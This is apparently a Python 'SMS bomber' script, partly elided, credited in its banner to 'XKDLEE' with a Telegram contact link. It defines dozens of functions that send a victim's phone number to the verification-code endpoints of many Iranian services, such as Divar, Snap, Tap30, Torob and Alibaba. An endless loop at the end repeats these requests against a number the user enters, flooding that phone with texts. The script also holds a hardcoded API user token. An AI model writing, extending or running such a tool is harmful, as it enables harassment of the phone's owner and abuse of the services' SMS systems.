...
def banner():
    ...
    print ('\t         \033[1;34m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
    print ('\t         \033[1;34m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
    print ('\t         \033[1;34m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m XKDLEE')
    print ('\t         \033[1;34m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
    print ('\t         \033[1;34m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
    print ('\t         \033[1;34m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
banner()
...
print("")
print("")
str = f"""\033[1;31m you can ask your questions from developer here : """
for char in str:
         stdout.write(char)
         stdout.flush()
         sleep(0.001/0.02)
webbrowser.open('https://t.me/xkdlee')
print("")
print("")
try:
...
def bama(phone):
    ...
    try:
        bamaR = post(timeout=5, url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, json=bamaD)
        if "0" in bamaR:
                    print(f'{r}(bama) {g}Code Was Sent')
                    return True
    except:
        pass        
def rubika(phone):
    ...
    try:
        ruR = post(timeout=5, url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
        if "OK" in ruR:
                        print(f'{r}(rubika) {g}Code Was Sent')
                        return True
    except:
        pass        
def snap(phone):
    ...
    try:
        ...
        if "OK" in snapR:
            print(f'{r}(Snap) {g}Code Was Sent')
            return True
    except:
        pass
def gap(phone):
...
def tap30(phone):
    ...
    try:
        ...
        if tap30R['result'] == "OK":
            print(f'{r}(Tap30) {g}Code Was Sent')
            return True
    except:
        pass
...
'x-standard-divar-error': 'true'}
    ...
    try:
        ...
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{r}(Divar) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if torobR["message"] == "pin code sent":
            print(f'{r}(Torob) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    ...
    try:
        ...
        if sfoodR['status'] == True:
            print(f'{r}(SnapFood) {g}Code Was Sent')
            return True
    except:
        pass
...
def sheypoor(phone):
    ...
    try:
        ...
        if sheyporR['success'] == True:
            print(f'{r}(Sheypoor) {g}Code Was Sent')
            return True
    except:
        pass
...
'x-xsrf-token': ''}
    try:
        ...
        if 'success' in okR:
            print(f'{r}(OfoghKourosh) {g}Code Was Sent')
            return True
    except:
        pass
...
def alibaba(phone):
    ...
    try:
        ...
        if alibabaR["result"]["success"] == True:
            print(f'{r}(AliBaba) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if smarketR['status'] == True:
            print(f'{r}(SnapMarket) {g}Code Was Sent')
            return True
    except:
        pass
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if gaR['Code'] == 1:
            print(f'{r}(GapFilm) {g}Code Was Sent')
            return True
    except:
        pass
def sTrip(phone):
    ...
    try:
        ...
        if sTripR['status_code'] == 200:
            print(f'{r}(Strip) {g}Code Was Sent')
            return True
    except:
        pass
...
def filmnet(phone):
    ...
    try:
        ...
        if Filmnet['meta']['operation_result'] == 'success':
            print(f'{r}(Filmnet) {g}Code Was Sent')
            return True
    except:
        pass
...
def drdr(phone):
    ...
    try:
        ...
        if drdr['status'] == 'success':
            print(f'{r}(DrDr) {g}Code Was Sent')
            return True
    except:
        pass
...
def itool(phone):
    ...
    try:
        ...
        if ok['success'] == True:
            print(f'{r}(Itool) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok['status'] == True:
            print(f'{r}(AnarGift) {g}Code Was Sent')
            return True
    except :
        pass
...
'username': 'BimitoClient'
    ...
    try:
        ...
        if ok["messageCode"] == 201:
            print(f'{r}(Azki) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'ok':
            print(f'{r}(Chamedoon) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'success':
            print(f'{r}(BaniMode) {g}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'تایید شماره تلفن همراه' in lendoR:
            print(f'{r}(Lendo) {g}Code Was Sent')
            return True
    except:
        pass
def olgoo(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{r}(NashrOlgoo) {g}Code Was Sent')
            return True
    except:
        pass
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['code'] == '1':
            print(f'{r}(PakhshShop) {g}Code Was Sent')
            return True
    except:
        pass
def didnegar(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{r}(DideNegar) {g}Code Was Sent')
            return True
    except:
        pass
def baskol(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['status'] == True:
            print(f'{r}(Baskol) {g}Code Was Sent')
            return True
    except:
        pass
def kilid(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['status'] == 'SUCCESS':
            print(f'{r}(Kilid) {g}Code Was Sent')
            return True
    except:
        pass
def basalam(phone):
...
'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
    try:
        ...
        if ok.status_code == 200:
            print(f'{r}(BaSalam) {g}Code Was Sent')
            return True
    except:
        pass
def see5(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    ...
    try:
        if ok == 'send_sms':
            print(f'{r}(See5) {g}Code Was Sent')
            return True
    except:
        pass
def ghabzino(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok["Parameters"] != None:
            print(f'{r}(Ghabzino) {g}Code Was Sent')
            return True
    except:
        pass
def simkhanF(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{r}(SimKhan) {g}Code Was Sent')
            return True
    except:
        pass
def simkhanT(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
            print(f'{r}(DrSaina) {g}Code Was Sent')
            return True
    except:
        pass
def binjo(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['status'] == 'ok':
            print(f'{r}(BinJo) {g}Code Was Sent')
            return True
    except:
        pass
def limome(phone):
...
'X-Requested-With': 'XMLHttpRequest'}
    try:
        ...
        if liR['status'] == 'success':
            print(f'{r}(Limome) {g}Code Was Sent')
            return True
    except:
        pass
def bimito(phone):
...
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        ...
        if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
            print(f'{r}(BimitoVip) {g}Code Was Sent')
            return True
    except:
        pass
def bimitoVip(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        print(f'{r}(SeebIrani) {g}Code Was Sent')
        return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        print(f'{r}(MihanPezeshk) {g}Code Was Sent')
        return True
    except:
        pass
def mek(phone):
...
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
    ...
    try:
        ...
        if meR['isSuccess']:
            print(f'{r}(HamrahMechanic) {g}کد ارسال شد')
            return True
    except: pass
# ================================[SEND SMS FUNC]================================
...
while True:
    phone = is_phone(input(f'{g}number (dont use 0){g} {w}>>>> {g}'))
    if phone:
        break
try:
    Time = float(input(f'{g}[?] {g}sleep time  {g}[normal=0.1] {w}>>>> {g}'))
except ValueError:
    Time = 0.1
    print(f"{g}[0.1] {r}Used")
while True:
    try: Vip(phone, Time)
    except KeyboardInterrupt: exit(f'{g}[-] User Exited')
    except: print(f'{g}[-] Error TimeOut')
